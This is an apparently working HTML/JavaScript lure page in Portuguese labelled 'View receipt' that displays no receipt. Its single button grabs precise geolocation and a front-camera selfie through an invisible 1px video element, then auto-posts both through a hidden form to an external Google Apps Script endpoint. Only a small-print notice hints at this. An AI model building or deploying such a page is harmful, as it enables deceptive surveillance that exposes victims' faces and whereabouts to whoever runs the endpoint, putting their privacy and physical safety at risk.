
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport"
        content="width=device-width, initial-scale=1">

  <title>Ver comprovante</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #ffffff;
      font-family: Arial, sans-serif;
    }

    main {
      width: 100%;
      max-width: 400px;
      padding: 24px;
      text-align: center;
    }

    #registrar {
      width: 100%;
      max-width: 300px;
      min-height: 58px;
      padding: 15px 24px;
      border: none;
      border-radius: 12px;
      background: #1769e0;
      color: white;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
    }

    #registrar:disabled {
      opacity: 0.6;
      cursor: wait;
    }

    #aviso {
      margin: 20px auto 0;
      max-width: 320px;
      color: #555;
      font-size: 13px;
      line-height: 1.5;
    }

    #status {
      margin-top: 16px;
      color: #555;
      font-size: 13px;
      line-height: 1.5;
    }

    video {
      position: absolute;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
    }
  </style>
</head>

<body>
  <main>

    <button
      id="registrar"
      type="button"
      onclick="registrar()"
    >
      Ver comprovante
    </button>

    <p id="aviso">
      Ao continuar, você autoriza a captura de uma
      selfie e o registro da sua localização,
      que serão enviados ao sistema.
    </p>

    <p id="status" role="status" aria-live="polite"></p>

    <video
      id="camera"
      autoplay
      playsinline
      muted
    ></video>

    <form
      id="formulario"
      method="POST"
      style="display:none"
    >
      <input type="hidden" name="foto" id="foto">
      <input type="hidden" name="latitude" id="latitude">
      <input type="hidden" name="longitude" id="longitude">
    </form>

  </main>

  <script>
    const APPS_SCRIPT_URL =
      "https://script.google.com/macros/s/AKfycbzD_5KAG9p15OjSej4FiUJbEXs0pUX5b4TLr9Wh3wX6ex4AEsV5KSGiFQfzBqyswE3Hpw/exec";

    const camera = document.getElementById("camera");
    const botao = document.getElementById("registrar");
    const statusEl = document.getElementById("status");
    const formulario = document.getElementById("formulario");

    formulario.action = APPS_SCRIPT_URL;

    function obterLocalizacao() {
      return new Promise((resolve, reject) => {

        if (!navigator.geolocation) {
          reject(new Error(
            "Localização indisponível neste navegador."
          ));
          return;
        }

        navigator.geolocation.getCurrentPosition(
          posicao => resolve(posicao.coords),
          erro => reject(erro),
          {
            enableHighAccuracy: true,
            timeout: 20000,
            maximumAge: 0
          }
        );
      });
    }

    async function registrar() {
      botao.disabled = true;

      let stream = null;

      try {
        statusEl.textContent =
          "Solicitando permissões...";

        // Solicita câmera e localização.
        const resultados = await Promise.allSettled([
          obterLocalizacao(),
          navigator.mediaDevices.getUserMedia({
            video: {
              facingMode: "user",
              width: { ideal: 640 }
            },
            audio: false
          })
        ]);

        if (resultados[1].status === "fulfilled") {
          stream = resultados[1].value;
        }

        if (resultados[0].status === "rejected") {
          throw new Error(
            "Não foi possível obter a localização."
          );
        }

        if (resultados[1].status === "rejected") {
          throw new Error(
            "Não foi possível acessar a câmera."
          );
        }

        const local = resultados[0].value;

        statusEl.textContent = "Preparando registro...";

        camera.srcObject = stream;
        await camera.play();

        // Aguarda o primeiro quadro da câmera.
        if (!camera.videoWidth || !camera.videoHeight) {
          await new Promise((resolve, reject) => {
            const limite = setTimeout(
              () => reject(new Error(
                "A câmera demorou para iniciar."
              )),
              15000
            );

            camera.addEventListener(
              "loadeddata",
              () => {
                clearTimeout(limite);
                resolve();
              },
              { once: true }
            );
          });
        }

        const canvas = document.createElement("canvas");

        canvas.width = 640;
        canvas.height = Math.round(
          camera.videoHeight * 640 / camera.videoWidth
        );

        canvas.getContext("2d").drawImage(
          camera,
          0,
          0,
          canvas.width,
          canvas.height
        );

        const foto = canvas.toDataURL(
          "image/jpeg",
          0.7
        );

        document.getElementById("foto").value = foto;
        document.getElementById("latitude").value =
          local.latitude;
        document.getElementById("longitude").value =
          local.longitude;

        // Desliga a câmera após a captura.
        stream.getTracks().forEach(track => track.stop());
        stream = null;
        camera.srcObject = null;

        statusEl.textContent = "Enviando...";

        // Envia automaticamente ao Apps Script.
        formulario.submit();

      } catch (erro) {
        statusEl.textContent =
          "Não foi possível concluir a operação. " +
          "Verifique as permissões e tente novamente.";

        botao.disabled = false;

      } finally {
        if (stream) {
          stream.getTracks().forEach(
            track => track.stop()
          );
        }
      }
    }
  </script>
</body>
</html>
